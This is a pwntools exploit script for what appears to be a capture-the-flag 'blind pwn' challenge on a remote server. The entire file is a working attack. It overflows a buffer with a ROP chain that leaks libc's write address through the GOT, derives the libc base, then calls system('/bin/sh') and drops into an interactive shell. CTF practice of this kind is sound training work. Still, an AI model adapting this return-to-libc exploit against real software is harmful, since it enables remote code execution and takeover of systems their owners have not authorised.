#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Copyright © 2019 vam <jpwan21@gmail.com>

from pwn import *
context.log_level="debug"

libc = ELF("../libc-2.23.so")

r=remote("pwn.sixstars.team",22041)


pop_rdi_ret = 0x400783
pop_rsi_r15_ret = 0x400781
bug = 0x400666
write_plt = 0x400520
write_got = 0x601018

f = {
    0x28:p64(pop_rdi_ret),
    0x30:p64(1),
    0x38:p64(pop_rsi_r15_ret),
    0x40:p64(write_got),
    0x48:p64(0),
    0x50:p64(write_plt),
    0x58:p64(bug)
}
payload = fit(f,filler="\x00",length=0xa0) 

r.sendlineafter("Welcome to this blind pwn!\n", payload)
write_addr = u64(r.recv(6).ljust(8,'\x00'))

libc.address = write_addr - libc.sym['write']
info("libc.address: %16x", libc.address)
r.clean()

system = libc.sym['system']
binsh = libc.search("/bin/sh").next()
f2={
        0x28:p64(pop_rdi_ret),
        0x30:p64(binsh),
        0x38:p64(system)
}

payload2 = fit(f2,filler="\x00",length=0x50)
r.sendline(payload2)

r.interactive()
